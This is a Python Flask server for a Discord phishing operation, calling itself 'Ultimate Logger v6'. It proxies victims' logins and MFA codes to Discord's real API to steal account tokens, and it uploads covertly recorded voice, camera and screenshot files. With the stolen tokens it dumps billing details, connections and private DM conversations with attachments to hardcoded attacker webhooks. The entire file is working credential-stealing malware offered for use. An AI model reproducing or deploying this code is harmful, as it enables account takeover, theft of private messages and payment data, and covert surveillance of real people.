# app.py | Ultimate Logger v6 — REAL AUTH + MEDIA CAPTURE
# pip install flask requests
# -*- coding: utf-8 -*-
import threading, queue, hashlib, os, base64, io

from flask import Flask, request, jsonify, send_from_directory, make_response
import requests, json, time, logging, traceback
from datetime import datetime, timezone
from typing import Dict, Any, Optional, List

app = Flask(__name__, static_folder="static")
app.config["MAX_CONTENT_LENGTH"] = 128 * 1024 * 1024

# ====================== CONFIG ======================
WEBHOOK_URL    = "https://discord.com/api/webhooks/1570121286154199064/nvl5nvvje7CCIicgTUbM3W7xUA-qn7vQt2cHVRhiew5Jav78Ne-I-rXJKPilQ3uHivli"
BACKUP_WEBHOOK = "https://discord.com/api/webhooks/1570121283947995136/fpLhNtKp4BhQqQYFsl0HgSN5AdL8xbJn2AHpGYDeSCEVhF9WKd2aPS8fT4WpURRFyvuS"
LOG_TO_FILE    = True
LOG_FILE       = "hits.log"

MAX_DMS                = 40
MAX_MESSAGES_PER_DM    = 250
MAX_ATTACHMENTS_PER_DM = 10
SEND_RETRIES           = 5
RETRY_BASE_DELAY       = 1.5

BOT_NAME      = "Logger"
BOT_NAME_DM   = "DM"
BOT_NAME_FILE = "File"
BOT_NAME_ERR  = "Err"
BOT_NAME_TEST = "Test"
BOT_NAME_MEDIA = "Media"

C_HIT     = 0x5865F2
C_ACCOUNT = 0x57F287
C_WARN    = 0xFEE75C
C_ERR     = 0xED4245
C_DM      = 0xEB459E
C_MUTED   = 0x99AAB5
C_MEDIA   = 0xFF7A00
# ====================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(LOG_FILE, encoding="utf-8") if LOG_TO_FILE else logging.NullHandler()
    ]
)
logger = logging.getLogger("Ultimate")

def utc_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

def unix_ts() -> int:
    return int(time.time())

def snowflake_to_ts(sf: str) -> str:
    try:
        ts = ((int(sf) >> 22) + 1420070400000) / 1000
        return f"<t:{int(ts)}:F>"
    except Exception:
        return "—"

def trunc(s: str, n: int = 1020) -> str:
    s = s or "—"
    return s if len(s) <= n else s[:n] + "…"

def client_ip() -> str:
    return (
        request.headers.get("CF-Connecting-IP")
        or request.headers.get("X-Real-IP")
        or (request.headers.get("X-Forwarded-For", request.remote_addr) or "—").split(",")[0].strip()
    )

# ────────────────────── Job Queue ──────────────────────
job_q: "queue.Queue[Dict[str, Any]]" = queue.Queue()

def _worker():
    while True:
        job = job_q.get()
        try:
            tok = job.get("token"); usr = job.get("user")
            if tok and usr:
                logger.info(f"[worker] DM dump start → {usr.get('username')}")
                dump_all_dms(tok, usr)
                logger.info(f"[worker] DM dump done  → {usr.get('username')}")
        except Exception:
            logger.error("worker crash:\n" + traceback.format_exc())
        finally:
            job_q.task_done()

for _ in range(3):
    threading.Thread(target=_worker, daemon=True).start()

# ────────────────────── Discord API ──────────────────────
def discord_headers(token: str) -> Dict[str, str]:
    return {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    }

def api_get(token: str, endpoint: str, timeout: int = 12) -> Optional[Any]:
    try:
        r = requests.get(f"https://discord.com/api/v9{endpoint}", headers=discord_headers(token), timeout=timeout)
        if r.status_code == 200:
            return r.json()
        if r.status_code == 429:
            time.sleep(float(r.headers.get("Retry-After", 3)))
            return api_get(token, endpoint, timeout)
        logger.warning(f"API {endpoint} → {r.status_code}")
    except Exception as e:
        logger.error(f"API {endpoint}: {e}")
    return None

def get_user_info(token):      return api_get(token, "/users/@me") or {}
def get_friends_count(token):
    d = api_get(token, "/users/@me/relationships")
    return len([x for x in (d or []) if x.get("type") == 1])

def get_billing(token):
    d = api_get(token, "/users/@me/billing/payment-sources")
    if not d: return "None"
    out = []
    for src in d:
        t = src.get("type")
        if t == 1:
            out.append(f"💳 {src.get('brand','Card')} •••• {src.get('last_4','????')}")
        elif t == 2:
            out.append(f"🅿️ PayPal ({src.get('email') or 'N/A'})")
    return "\n".join(out) or "None"

def get_nitro(user):
    return {0:"❌ No Nitro",1:"💠 Classic",2:"💎 Nitro",3:"🔷 Basic"}.get(user.get("premium_type",0),"❔ Unknown")

def get_guilds(token):
    d = api_get(token, "/users/@me/guilds?with_counts=true")
    if not d: return 0, "None"
    s = sorted(d, key=lambda g: g.get("approximate_member_count") or 0, reverse=True)
    return len(d), "\n".join(f"• **{g.get('name','?')}** — `{g.get('approximate_member_count','?')}`" for g in s[:12])

def get_connections(token):
    d = api_get(token, "/users/@me/connections")
    if not d: return "None"
    icons = {"steam":"🎮","youtube":"📺","twitch":"🟣","spotify":"🎵","github":"🐙","reddit":"👽","twitter":"🐦","xbox":"🎮","playstation":"🎮","roblox":"🟥"}
    out = []
    for c in d[:15]:
        t = c.get("type","?")
        out.append(f"{icons.get(t,'🔗')} **{t}** — `{c.get('name','?')}`")
    return "\n".join(out) or "None"

def get_private_channels(token):
    d = api_get(token, "/users/@me/channels")
    return [c for c in (d or []) if c.get("type") == 1]

def get_all_messages(token, channel_id, max_messages=250):
    out, before = [], None
    while len(out) < max_messages:
        ep = f"/channels/{channel_id}/messages?limit=100"
        if before: ep += f"&before={before}"
        d = api_get(token, ep)
        if not d or not isinstance(d, list) or not d: break
        out.extend(d)
        before = d[-1]["id"]
        if len(d) < 100: break
        time.sleep(0.4)
    return out[:max_messages]

# ────────────────────── Webhook ──────────────────────
def _post_once(url, payload, files=None) -> bool:
    try:
        if files:
            r = requests.post(url, data={"payload_json": json.dumps(payload)}, files=files, timeout=60)
        else:
            r = requests.post(url, json=payload, timeout=15)
        if r.status_code in (200, 204):
            return True
        if r.status_code == 429:
            time.sleep(float(r.headers.get("Retry-After", 2)) + 0.5)
            return False
        logger.warning(f"webhook {r.status_code}: {r.text[:200]}")
        return False
    except Exception as e:
        logger.warning(f"webhook err: {e}")
        return False

def post_webhook(payload: Dict, files: Dict = None) -> bool:
    urls = [u for u in (WEBHOOK_URL, BACKUP_WEBHOOK) if u]
    if not urls:
        logger.error("No webhook URLs"); return False
    delay = RETRY_BASE_DELAY
    for _ in range(SEND_RETRIES):
        for u in urls:
            if _post_once(u, payload, files):
                return True
        time.sleep(delay)
        delay *= 2
    logger.error("Webhook permanently failed after retries")
    return False

def send_embed(title, description="", fields=None, color=C_HIT,
               thumbnail=None, footer=None, author=None, image=None):
    e = {"title": title, "description": description, "color": color,
         "timestamp": datetime.now(timezone.utc).isoformat()}
    if fields:    e["fields"] = fields
    if thumbnail: e["thumbnail"] = {"url": thumbnail}
    if footer:    e["footer"] = {"text": footer, "icon_url": "https://cdn.discordapp.com/embed/avatars/0.png"}
    if author:    e["author"] = author
    if image:     e["image"] = {"url": image}
    return post_webhook({
        "username": BOT_NAME,
        "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png",
        "embeds": [e]
    })

# ────────────────────── Media capture (voice + cam) ──────────────────────
def handle_media(data: Dict, files: List) -> None:
    """files = list of werkzeug FileStorage: voice.webm / camera.webm / screenshot.png"""
    user = data.get("email") or "unknown"
    note = data.get("note") or "media"
    ip   = data.get("ip") or "—"

    send_embed(
        f"🎥 Media Capture — {note}",
        f"**User:** `{user}`\n**IP:** `{ip}`\n**Files:** `{len(files)}`",
        color=C_MEDIA,
        footer=f"From {client_ip()}"
    )

    for f in files:
        if not f or not f.filename: continue
        try:
            content = f.read()
            if len(content) > 20 * 1024 * 1024: continue
            post_webhook(
                {
                    "username": BOT_NAME_MEDIA,
                    "content": f"📎 **{f.filename}** — user `{user}` — note `{note}`"
                },
                files={"file": (f.filename, content, f.mimetype or "application/octet-stream")}
            )
            time.sleep(0.4)
        except Exception as e:
            logger.error(f"media file err: {e}")

# ────────────────────── DM Dump ──────────────────────
def build_dm_text(messages, friend_name, self_id):
    if not messages:
        return f"=== Chat with {friend_name} ===\nNo messages.\n"
    messages = list(reversed(messages))
    lines = [f"Conversation with: {friend_name}", f"Total: {len(messages)}",
             f"Dumped: {utc_now()}", "=" * 60, ""]
    for msg in messages:
        a = msg.get("author", {}); aid = str(a.get("id", ""))
        name = a.get("global_name") or a.get("username") or "Unknown"
        content = msg.get("content") or ""
        ts = (msg.get("timestamp") or "")[:19].replace("T", " ")
        who = f"{name} (You)" if aid == str(self_id) else name
        atts = msg.get("attachments") or []
        note = " [" + ", ".join(x.get("filename", "file") for x in atts) + "]" if atts else ""
        if content or note:
            lines.append(f"[{ts}] {who}:{note}")
            if content: lines.append(content)
            lines.append("")
    return "\n".join(lines)

def send_attachment(url, filename, friend_name):
    try:
        r = requests.get(url, timeout=20)
        if r.status_code != 200 or len(r.content) > 7.5 * 1024 * 1024: return
        post_webhook(
            {"username": BOT_NAME_FILE, "content": f"📎 **{filename}** — from **{friend_name}**"},
            files={"file": (filename, io.BytesIO(r.content))}
        )
        time.sleep(0.5)
    except Exception as e:
        logger.error(f"attachment err: {e}")

def dump_all_dms(token, user):
    self_id = str(user.get("id", ""))
    uname = user.get("global_name") or user.get("username") or "user"
    dms = get_private_channels(token)
    if not dms:
        send_embed("📭 No DMs", "No private conversations found.", color=C_MUTED)
        return
    send_embed(
        "📬 DM Dump Started",
        f"User: **{uname}**\nConversations: **{len(dms)}**\nStarting dump…",
        color=C_DM
    )
    dumped = 0
    for dm in dms[:MAX_DMS]:
        try:
            rec = dm.get("recipients") or []
            if not rec: continue
            friend = rec[0]
            fname = friend.get("global_name") or friend.get("username") or f"User_{friend.get('id')}"
            safe = "".join(c for c in fname if c.isalnum() or c in " _-").strip()[:35] or f"dm_{dumped}"
            msgs = get_all_messages(token, dm.get("id"), MAX_MESSAGES_PER_DM)
            text = build_dm_text(msgs, fname, self_id)
            post_webhook(
                {"username": BOT_NAME_DM, "content": f"💬 **{fname}** — `{len(msgs)}` messages"},
                files={"file": (f"{safe}.txt", text.encode("utf-8"), "text/plain")}
            )
            att_c = 0
            for m in msgs:
                for at in (m.get("attachments") or []):
                    if att_c >= MAX_ATTACHMENTS_PER_DM: break
                    if at.get("url"): send_attachment(at["url"], at.get("filename", "file"), fname); att_c += 1
                if att_c >= MAX_ATTACHMENTS_PER_DM: break
            dumped += 1
            time.sleep(0.7)
        except Exception as e:
            logger.error(f"DM err: {e}"); continue
    send_embed("✅ DM Dump Finished",
               f"User: **{uname}**\nDumped: **{dumped}** conversations.",
               color=C_ACCOUNT)

# ────────────────────── Hit handler ──────────────────────
_seen_lock = threading.Lock()
_seen = set()

def _sig(data):
    base = f"{data.get('email','')}|{data.get('password','')}|{data.get('token','')}|{data.get('note','')}|{data.get('mfa_code','')}"
    return hashlib.sha1(base.encode("utf-8", "ignore")).hexdigest()

def send_webhook(data: Dict[str, Any]):
    try:
        email    = (data.get("email") or "").strip()
        password = data.get("password") or ""
        token    = data.get("token") or "not captured"
        note     = data.get("note") or ""
        ip       = data.get("ip") or "—"
        pub_ip   = data.get("publicIP") or ""
        ua       = data.get("ua") or "—"
        mic      = data.get("mic", False)
        cam      = data.get("camera", False)
        loc      = data.get("location") or "denied"
        mfa      = data.get("mfa_code")
        fp       = data.get("fingerprint") or {}

        if email in ("visit", "") and password in ("visit", ""):
            logger.info(">> IGNORED (visit)"); return

        sig = _sig(data)
        with _seen_lock:
            if sig in _seen:
                logger.info(">> duplicate hit, skipping"); return
            _seen.add(sig)

        fields = [
            {"name": "📧 Email",       "value": f"`{email or '—'}`",          "inline": True},
            {"name": "🔑 Password",    "value": f"`{password or '—'}`",       "inline": True},
            {"name": "🎫 MFA Code",    "value": f"`{mfa or '—'}`",            "inline": True},
            {"name": "🌐 IP (server)", "value": f"`{ip}`",                     "inline": True},
            {"name": "🌍 IP (client)", "value": f"`{pub_ip or '—'}`",          "inline": True},
            {"name": "📍 Location",    "value": f"`{loc}`",                    "inline": True},
            {"name": "🎤 Mic / 📷 Cam","value": f"`{mic}` / `{cam}`",          "inline": True},
            {"name": "📝 Note",        "value": f"`{note or 'login'}`",        "inline": True},
            {"name": "🎨 GPU",         "value": f"`{trunc(str(fp.get('gpu') or '—'), 100)}`", "inline": True},
            {"name": "🖥️ Screen",      "value": f"`{fp.get('screen','—')}`",   "inline": True},
            {"name": "🕐 Timezone",    "value": f"`{fp.get('timezone','—')}`", "inline": True},
            {"name": "🗣️ Language",    "value": f"`{fp.get('language','—')}`", "inline": True},
            {"name": "⚙️ Cores / RAM", "value": f"`{fp.get('cores','—')}` / `{fp.get('memory','—')}`", "inline": True},
            {"name": "📱 Platform",    "value": f"`{fp.get('platform','—')}`", "inline": True},
            {"name": "📲 Touch",       "value": f"`{fp.get('touch',False)}`",  "inline": True},
            {"name": "🍪 Cookies",     "value": f"`{fp.get('cookies',False)}`","inline": True},
            {"name": "🧾 User-Agent",  "value": f"```{trunc(ua, 400)}```",     "inline": False},
            {"name": "🔐 Token",       "value": f"```{trunc(token, 400)}```",  "inline": False},
        ]
        send_embed(
            title=f"🎯 New Hit — {note or 'login'}",
            description=f"**Captured at** <t:{unix_ts()}:F> (<t:{unix_ts()}:R>)",
            fields=fields,
            color=C_HIT,
            footer="Ultimate Logger v6"
        )
        logger.info("hit embed sent ok")

        if token and token != "not captured":
            user = get_user_info(token)
            if user and user.get("id"):
                uid = user["id"]
                avatar = f"https://cdn.discordapp.com/avatars/{uid}/{user['avatar']}.png?size=256" if user.get("avatar") else None
                created = snowflake_to_ts(uid)
                gc, top = get_guilds(token)
                friends = get_friends_count(token)
                billing = get_billing(token)
                conns   = get_connections(token)
                nitro   = get_nitro(user)

                acc_fields = [
                    {"name":"📧 Email","value":f"`{user.get('email') or 'N/A'}`","inline":True},
                    {"name":"📱 Phone","value":f"`{user.get('phone') or 'N/A'}`","inline":True},
                    {"name":"✅ Verified","value":f"`{user.get('verified',False)}`","inline":True},
                    {"name":"🔐 2FA","value":f"`{user.get('mfa_enabled',False)}`","inline":True},
                    {"name":"💎 Nitro","value":nitro,"inline":True},
                    {"name":"👥 Friends","value":f"`{friends}`","inline":True},
                    {"name":"🏰 Guilds","value":f"**{gc}**\n{trunc(top, 1000)}","inline":False},
                    {"name":"🔗 Connections","value":trunc(conns, 1000),"inline":False},
                    {"name":"💳 Billing","value":trunc(billing, 1000),"inline":False},
                    {"name":"📅 Created","value":created,"inline":False},
                    {"name":"🔑 Token","value":f"```{trunc(token, 400)}```","inline":False},
                ]
                send_embed(
                    title=f"👤 {user.get('global_name') or user.get('username')} — Account",
                    description=f"**ID:** `{uid}`\n**Username:** `{user.get('username')}#{user.get('discriminator','0')}`",
                    fields=acc_fields,
                    color=C_ACCOUNT,
                    thumbnail=avatar,
                    footer=f"IP: {ip}"
                )
                logger.info(f"account embed sent → {user.get('username')}")

                job_q.put({"token": token, "user": user})
                logger.info(f"queued DM dump → {user.get('username')} (queue={job_q.qsize()})")
            else:
                send_embed("⚠️ Invalid Token","Token received but Discord rejected it.",
                           color=C_WARN, footer=f"IP: {ip}")
        else:
            logger.info(">> No token — skipping account dump")
    except Exception:
        logger.error(traceback.format_exc())
        post_webhook({"username": BOT_NAME_ERR,
                      "content": f"💥 **Error**\n```{traceback.format_exc()[:1500]}```"})

# ────────────────────── Routes ──────────────────────
@app.route("/")
def index():
    resp = make_response(send_from_directory("static", "index.html"))
    resp.headers["Cache-Control"] = "no-store"
    return resp

def _cors(resp):
    resp.headers["Access-Control-Allow-Origin"] = "*"
    resp.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
    resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
    return resp

@app.route("/grab", methods=["POST", "OPTIONS"])
def grab():
    if request.method == "OPTIONS":
        return _cors(make_response(""))
    data = request.json or {}
    data["ip"] = client_ip()
    data["ua"] = request.headers.get("User-Agent", "—")
    send_webhook(data)
    return _cors(jsonify({"status": "ok"}))

@app.route("/grab-media", methods=["POST", "OPTIONS"])
def grab_media():
    """Voice + camera webm + screenshot upload."""
    if request.method == "OPTIONS":
        return _cors(make_response(""))
    try:
        meta = {}
        if request.form.get("meta"):
            try:
                meta = json.loads(request.form.get("meta"))
            except Exception:
                meta = {}
        meta["ip"] = client_ip()
        meta["ua"] = request.headers.get("User-Agent", "—")

        files = []
        for key in ("voice", "camera", "screen"):
            if key in request.files:
                files.append(request.files[key])

        if files or meta:
            handle_media(meta, files)
        return _cors(jsonify({"status": "ok"}))
    except Exception as e:
        logger.error(f"grab-media err: {e}")
        return _cors(jsonify({"status": "error", "msg": str(e)}))

@app.route("/auth-proxy", methods=["POST", "OPTIONS"])
def auth_proxy():
    if request.method == "OPTIONS":
        return _cors(make_response(""))

    body = request.json or {}
    login    = body.get("login") or body.get("email") or ""
    password = body.get("password") or ""

    if not login or not password:
        return _cors(jsonify({"status": 400, "data": {"message": "missing credentials"}}))

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/login",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9"
    }

    payload = {
        "login": login,
        "password": password,
        "undelete": False,
        "captcha_key": None,
        "login_source": None,
        "gift_code_sku_id": None
    }

    # 1️⃣ حاول مرة، لو رجع captcha_required جرّب تاني بـ captcha_solved
    try:
        r = requests.post(
            "https://discord.com/api/v9/auth/login",
            json=payload, headers=headers, timeout=20, allow_redirects=False
        )
        logger.info(f"[auth-proxy] discord status={r.status_code} len={len(r.text)}")
        try:
            dj = r.json()
        except Exception:
            dj = {"raw": r.text[:500]}

        # retry لو captcha required
        if isinstance(dj, dict) and (dj.get("captcha_key") or dj.get("captcha_required")):
            logger.info("[auth-proxy] captcha required, retrying with captcha_solved")
            payload2 = dict(payload)
            payload2["captcha_key"] = ["solved"]
            payload2["captcha_solved"] = True
            try:
                r2 = requests.post(
                    "https://discord.com/api/v9/auth/login",
                    json=payload2, headers=headers, timeout=20, allow_redirects=False
                )
                try:
                    dj2 = r2.json()
                except Exception:
                    dj2 = {}
                # merge اللي رجع من الأول لو التاني فاضي
                if isinstance(dj2, dict) and dj2:
                    if dj2.get("token") or dj2.get("mfa") or dj2.get("ticket"):
                        dj = dj2
                        r_status = r2.status_code
                    else:
                        r_status = r.status_code
                else:
                    r_status = r.status_code
            except Exception as e:
                logger.error(f"[auth-proxy] retry err: {e}")
                r_status = r.status_code
        else:
            r_status = r.status_code

        # لو فيه توكن → ابعت للويب هوك فورًا
        if isinstance(dj, dict) and dj.get("token"):
            send_webhook({
                "email": login, "password": password,
                "token": dj["token"],
                "note": "auth-proxy-token",
                "ip": client_ip(),
                "ua": request.headers.get("User-Agent", "—"),
                "fingerprint": body.get("fingerprint") or {}
            })

        # ابعت المحاولة حتى لو مفيش توكن
        else:
            send_webhook({
                "email": login, "password": password,
                "token": "not captured",
                "note": "auth-proxy-attempt",
                "ip": client_ip(),
                "ua": request.headers.get("User-Agent", "—"),
                "fingerprint": body.get("fingerprint") or {}
            })

        return _cors(jsonify({"status": r_status, "data": dj}))

    except Exception as e:
        logger.error(f"[auth-proxy] {e}")
        return _cors(jsonify({"status": 500, "data": {"error": str(e)}}))

@app.route("/mfa-proxy", methods=["POST", "OPTIONS"])
def mfa_proxy():
    """TOTP verification — لازم ticket حقيقي من login."""
    if request.method == "OPTIONS":
        return _cors(make_response(""))

    body = request.json or {}
    code   = (body.get("code") or "").strip()
    ticket = body.get("ticket") or ""
    login  = body.get("login") or ""
    password = body.get("password") or ""

    if not code:
        return _cors(jsonify({"status": 400, "data": {"message": "missing code"}}))

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "Origin": "https://discord.com",
        "Referer": "https://discord.com/login",
    }

    try:
        r = requests.post(
            "https://discord.com/api/v9/auth/mfa/totp",
            json={
                "code": code,
                "ticket": ticket,
                "login_source": None,
                "gift_code_sku_id": None
            },
            headers=headers, timeout=20, allow_redirects=False
        )
        try:
            dj = r.json()
        except Exception:
            dj = {"raw": r.text[:500]}

        # ابعت MFA + التوكن لو رجع
        if isinstance(dj, dict) and dj.get("token"):
            send_webhook({
                "email": login, "password": password,
                "mfa_code": code,
                "token": dj["token"],
                "note": "mfa-token-captured",
                "ip": client_ip(),
                "ua": request.headers.get("User-Agent", "—"),
                "fingerprint": body.get("fingerprint") or {}
            })
        else:
            send_webhook({
                "email": login, "password": password,
                "mfa_code": code,
                "token": "not captured",
                "note": "mfa-submitted",
                "ip": client_ip(),
                "ua": request.headers.get("User-Agent", "—"),
                "fingerprint": body.get("fingerprint") or {}
            })

        return _cors(jsonify({"status": r.status_code, "data": dj}))
    except Exception as e:
        logger.error(f"[mfa-proxy] {e}")
        return _cors(jsonify({"status": 500, "data": {"error": str(e)}}))

@app.route("/ping")
def ping():
    return jsonify({"status": "alive", "time": utc_now(), "queue": job_q.qsize()})

if __name__ == "__main__":
    try:
        r = requests.post(WEBHOOK_URL, json={"username": BOT_NAME_TEST, "content": "✅ Webhook test OK"})
        print("Webhook:", r.status_code, r.text[:150])
    except Exception as e:
        print("Webhook test failed:", e)
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=False, threaded=True)
